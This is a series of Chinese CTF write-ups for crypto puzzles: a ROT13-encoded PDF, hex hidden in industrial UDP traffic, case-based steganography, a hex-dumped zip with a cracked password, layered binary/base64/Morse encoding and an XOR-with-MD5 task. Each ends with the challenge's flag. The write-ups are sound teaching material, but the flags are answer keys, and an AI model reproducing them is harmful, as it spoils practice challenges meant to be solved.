**题目附件：**

[9e45191069704531accd66f1ee1d5b2b.pdf](https://adworld.xctf.org.cn/media/task/attachments/9e45191069704531accd66f1ee1d5b2b.pdf)

**题目思路：**

此题把整个pdf文档进行rot13加密，解密后把图片复制出来得到flag

**解题过程：**

下载附件pdf打不开，找个pdf来对比，一个正常的是%PDF-1.7，题目给的是%CQS-1.5。

![img](https://img-blog.csdnimg.cn/20200329201752783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RjaHVhMTIz,size_16,color_FFFFFF,t_70)

看起来需要将整个文档rot13解密，先把前几个字符进行rot13解密验证思路：

![img](https://img-blog.csdnimg.cn/2020032920212216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RjaHVhMTIz,size_16,color_FFFFFF,t_70)

使用命令进行rot13解密，就可以打开新的pdf了，但是flag被挡住了。

```bash
cat 9e45191069704531accd66f1ee1d5b2b.pdf | tr 'A-Za-z' 'N-ZA-Mn-za-m' > new.pdf
```

最后将图片粘贴到绘图里面去，或者聊天窗口里去，即可看到flag

![img](https://img-blog.csdnimg.cn/20200329203339337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RjaHVhMTIz,size_16,color_FFFFFF,t_70)

BITSCTF{save_the_kid}

#### 7-crypto-工业协议分析2

**题目描述：**

在进行工业企业检查评估工作中，发现了疑似感染恶意软件的上位机。现已提取出上位机通信流量，尝试分析出异常点，获取FLAG。 flag形式为 flag{}

**题目思路：**

flag特征:四个6x开头，接一个7b，结尾再来个7d的字符串

**解题过程**:

打开流量包，发现存在关于ARP、UDP、SNA协议的流量包，其中存在大量的UDP流量，如图所示：

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/%E5%B7%A5%E4%B8%9A%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%902/1.png)

首先对UDP流量包进行分析，筛选udp，分析发现UDP流量包的长度存在大量相同，按照长度排序，一共出现的长度分别为`16 17 12 14 10 18 19 20 22 25 32 89 95 104 105 116 131 137 524 528`，在这些长度中仅`12，89，104，105，131，137`出现一次，其余长度多次出现，于是猜测这仅出现一次的流量包存在异常，于是分别分析`12，89，104，105，131，137`对应的流量包，发现`131，137`对应的流量包存在异常的字符串，如图所示：

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/%E5%B7%A5%E4%B8%9A%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%902/3.png)

提取出字符串`666c61677b37466f4d3253746b6865507a7d`，并转换成对应ACII码(D:\CTF\Crypto\编码与密码\万能字符转换Character1.2.exe)，得到Flag。

flag{7FoM2StkhePz}

#### 8-crypto-sherlock

**题目思路：**

除去所有大写字母，除去所有小写字母，二进制转换为ASCII

**解题过程**:

下载的文件中有一堆文本。

通过仔细观察，会发现随机大小写。如果除去所有小写字母，则会得到字符串，并且ZERO和ONE到处都是

```python
c=[]
with open("1.txt", "r") as f:
    c+= f.read()
f=''
o=''
for s in c:
    if ord(s)<=90 and ord(s)>=65:
        f+=s
        if ord(s)==90:
            o+='0'
        if ord(s)==78:
            o+='1'
print(f)
print(o)
```

我写了一个小脚本可以把文档中的大写打印出来，最后转化成数字打印出来。

```python
ZEROONEZEROZEROZEROZEROONEZEROZEROONEZEROZEROONEZEROZEROONEZEROONEZEROONEZEROONEZEROZEROZEROONEZEROONEZEROZEROONEONEZEROONEZEROZEROZEROZEROONEONEZEROONEZEROONEZEROONEZEROZEROZEROONEZEROZEROZEROONEONEZEROZEROONEONEONEONEZEROONEONEZEROONEONEZEROONEZEROZEROZEROZEROZEROONEONEZEROZEROZEROONEZEROONEONEZEROZEROONEZEROZEROZEROZEROONEONEZEROZEROONEONEZEROONEZEROONEONEONEONEONEZEROZEROONEONEZEROZEROZEROONEZEROONEONEZEROONEONEONEZEROZEROONEZEROONEONEONEONEONEZEROONEONEONEZEROZEROZEROZEROZEROONEONEZEROONEONEZEROZEROZEROZEROONEONEZEROONEZEROZEROZEROZEROONEONEZEROZEROZEROONEZEROONEONEZEROONEONEONEZEROZEROONEZEROONEONEONEONEONEZEROZEROONEONEZEROONEZEROONEZEROZEROONEONEZEROZEROZEROONEZEROZEROONEONEZEROONEONEONEZEROZEROONEONEZEROZEROONEONEZEROONEONEONEONEONEZEROONE
010000100100100101010100010100110100001101010100010001100111101101101000001100010110010000110011010111110011000101101110010111110111000001101100001101000011000101101110010111110011010100110001001101110011001101111101
```

在网站(https://cryptii.com/pipes/hex-to-text)上使用bytes转text就可以得到flag

BITSCTF{h1d3_1n_pl41n_5173}

#### 9-crypto-你猜猜

**题目描述：**

我们刚刚拦截了,敌军的文件传输获取一份机密文件,请君速速破解。

**题目思路：**

开头是504B，是.zip的头

**解题过程**:

打开txt是一串未知意义的字符串,但注意到字符串开头的`50 4B 03`猜想是zip压缩包的十六进制字节流

[<img src="http://qiniu.jagger2zr.com/blog/20190801/qqmsJM3WPxKT.png?imageslim" alt="mark" style="zoom: 67%;" />](http://qiniu.jagger2zr.com/blog/20190801/qqmsJM3WPxKT.png?imageslim)

把txt中的字节流复制一下，打开winhex64（D:\CTF\Reverse\WinHex\winhex19.3 SR-4 x86 x64\WinHex64.exe），新建16kb大小的文件->在数据头右键->编辑->剪贴板数据->写入->ASCII-Hex,另存为zip文件

[![mark](http://qiniu.jagger2zr.com/blog/20190801/eSkQO2w3uo5I.png?imageslim)](http://qiniu.jagger2zr.com/blog/20190801/eSkQO2w3uo5I.png?imageslim)

[![mark](http://qiniu.jagger2zr.com/blog/20190801/lsC1EypLGaIA.png?imageslim)](http://qiniu.jagger2zr.com/blog/20190801/lsC1EypLGaIA.png?imageslim)

zip加了密,用Ziperello（D:\CTF\Crypto\编码与密码\密码\Zip\Ziperello\Ziperello.exe）跑出密码是123456,得到flag

daczcasdqwdcsdzasd

#### 25-crypto-enc

**题目描述：**

Fady不是很理解加密与编码的区别 所以他使用编码而不是加密，给他的朋友传了一些秘密的消息。

**题目思路：**

ZERO->0,ONE->1,binary->hex->text->b64解码->莫斯解码

**解题过程**:

打开文件如图,先将ZERO替换为0,ONE替换为1(ctrl+h)

[![mark](http://qiniu.jagger2zr.com/blog/20190801/dkPJL2e7zcEN.png?imageslim)](http://qiniu.jagger2zr.com/blog/20190801/dkPJL2e7zcEN.png?imageslim)

[![mark](http://qiniu.jagger2zr.com/blog/20190801/Pdpgy6fWyiy4.png?imageslim)](http://qiniu.jagger2zr.com/blog/20190801/Pdpgy6fWyiy4.png?imageslim)

没有分隔符,考虑可能不是莫斯电码,尝试binary转字符(https://cryptii.com/pipes/hex-to-text)

[![mark](http://qiniu.jagger2zr.com/blog/20190801/etWheW4c9OpF.png?imageslim)](http://qiniu.jagger2zr.com/blog/20190801/etWheW4c9OpF.png?imageslim)

b64解码(https://tool.oschina.net/encrypt?type=3)

```
.- .-.. . -..- -.-. - ..-. - .... .---- ..... --- .---- ... ---  ..... ..- .--. ...-- .-. --- ..... . -.-. .-. ...-- - --- - -..- -
```

这次是摩斯电码(D:\CTF\Crypto\编码与密码\编码\摩斯电码编码解码.exe),然后都换成大写

```
ALEXCTFTH15O1SO5UP3RO5ECR3TOTXT
```

最后还需要加上大括号,并且把`O`换成`_`（贼坑）

ALEXCTF{TH15_1S_5UP3R_5ECR3T_TXT}

### crypto-x_xor_md5

用winhex打开,发现是一串数字,根据题目的意思猜测是异或,发现后面的数字有一串是一样的！！
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190607201135316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70)
把这一串16进制的数字copy下来,与每一行进行异或得到：

```
num = ['68', '4d', '4d', '4d', '0c', '00', '47', '4f', '4f', '44', '00', '4a', '4f', '42', '0c', '2a', 
'54', '48', '45', '00', '46', '4c', '41', '47', '00', '49', '53', '00', '4e', '4f', '54', '00', 
'72', '63', '74', '66', '5b', '77', '45', '11', '4c', '7f', '44', '10', '4e', '13', '7f', '3c', 
'55', '54', '7f', '57', '48', '14', '54', '7f', '49', '15', '7f', '0a', '4b', '45', '59', '20', 
'5d', '2a', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', 
'00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', 
'00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', 
'00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '72', '6f', '69', '73']
```

再转化为ASCII码,发现思路没错,出现rctf字样：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190607201351550.png)
接着,发现异或完的数字有许多是0x00隔开的,猜测是不是空格,空格是0x20,如果0x00是空格的话,那么就是0x00^0x20,
整体数据都异或0x20得到：

```
num2 = ['48', '6d', '6d', '6d', '2c', '20', '67', '6f', '6f', '64', '20', '6a', '6f', '62', '2c', '0a', 
'74', '68', '65', '20', '66', '6c', '61', '67', '20', '69', '73', '20', '6e', '6f', '74', '20', 
'52', '43', '54', '46', '7b', '57', '65', '31', '6c', '5f', '64', '30', '6e', '33', '5f', '36', 
'75', '74', '5f', '77', '68', '34', '74', '5f', '69', '35', '5f', '2a', '6b', '65', '79', '2a', 
'7d', '0a', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', 
'20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', 
'20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', 
'20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '52', '4f', '49', '53']
```

转化成字符串形式得到：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190607201948341.png)
*key后面是个空格,还有ut前面,猜测key被两个*包括,即*key*,所以就是0x00^0x2a,所以不对劲的地方1c^2a得到36,所以正确的列表如下:

```
num2 = ['48', '6d', '6d', '6d', '2c', '20', '67', '6f', '6f', '64', '20', '6a', '6f', '62', '2c', '0a', 
'74', '68', '65', '20', '66', '6c', '61', '67', '20', '69', '73', '20', '6e', '6f', '74', '20', 
'52', '43', '54', '46', '7b', '57', '65', '31', '6c', '5f', '64', '30', '6e', '33', '5f', '36', 
'75', '74', '5f', '77', '68', '34', '74', '5f', '69', '35', '5f', '2a', '6b', '65', '79', '2a', 
'7d', '0a', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', 
'20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', 
'20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '20', 
'20', '20', '20', '20', '20', '20', '20', '20', '20', '20', '52', '4f', '49', '53']
```

转化成字符串形式得到：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190607202217616.png)

嗯,差不多就是这样了,
回头看题目提示,说有MD5值,我们异或的就是MD5值吧,32位,刚刚好
编写脚本：

```
m = ['01','78','0C','4C','10','9E','32','37','12','0C','FB','BA','CB','8F','6A','53']
zz = []
for i in range(0,len(m)):
	x = int(m[i],16)
	zz.append(hex(x^32)[2:])
print(zz)
```

得到：['21', '58', '2c', '6c', '30', 'be', '12', '17', '32', '2c', 'db', '9a', 'eb', ' af', '4a', '73']

经过解码得到that
把*key*替换成that

也就是提交RCTF{We1l_d0n3_6ut_wh4t_i5_that}





